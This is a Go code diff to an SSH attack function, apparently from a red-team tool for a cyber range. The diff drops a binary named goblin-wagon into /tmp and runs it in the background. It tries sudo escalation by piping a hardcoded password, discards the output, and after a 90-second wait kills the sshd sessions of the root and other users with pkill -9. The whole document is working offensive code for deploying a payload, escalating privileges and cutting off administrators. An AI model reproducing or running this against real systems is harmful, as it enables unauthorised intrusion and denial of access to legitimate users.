@@ -260,19 +260,41 @@ func drop_and_run_ssh(client *ssh.Client, data []byte, ip string) error {
     }
     log.Printf("[+] SSH | %s | binary dropped to /tmp/goblin-wagon", ip)
 
+    // run payload
     execSession, err := client.NewSession()
     if err != nil {
         return err
     }
     defer execSession.Close()
 
-    log.Printf("[*] SSH | %s | executing payload", ip)
-    if err := execSession.Run("chmod +x /tmp/goblin-wagon && nohup /tmp/goblin-wagon &"); err != nil {
+    runCmd := `
+chmod +x /tmp/goblin-wagon
+if sudo -n true 2>/dev/null; then
+    nohup sudo /tmp/goblin-wagon > /dev/null 2>&1 &
+elif echo 'Cyberrange123!' | sudo -S true 2>/dev/null; then
+    echo 'Cyberrange123!' | sudo -S nohup /tmp/goblin-wagon > /dev/null 2>&1 &
+else
+    nohup /tmp/goblin-wagon > /dev/null 2>&1 &
+fi
+`
+    if err := execSession.Run(runCmd); err != nil {
         log.Printf("[-] SSH | %s | execution failed: %v", ip, err)
         return err
     }
-
     log.Printf("[+] SSH | %s | payload executing on target", ip)
+
+    // wait for wagon to finish then kill all sessions FROM OUTSIDE
+    time.Sleep(90 * time.Second)
+    killSession, err := client.NewSession()
+    if err != nil {
+        log.Printf("[-] SSH | %s | could not open kill session: %v", ip, err)
+        return nil
+    }
+    defer killSession.Close()
+    log.Printf("[*] SSH | %s | killing all sessions", ip)
+    killSession.Run("pkill -9 -u cyberrange sshd; pkill -9 -u sjohnson sshd; pkill -9 -u root sshd")
+    log.Printf("[+] SSH | %s | sessions killed", ip)
+
     return nil
 }
 
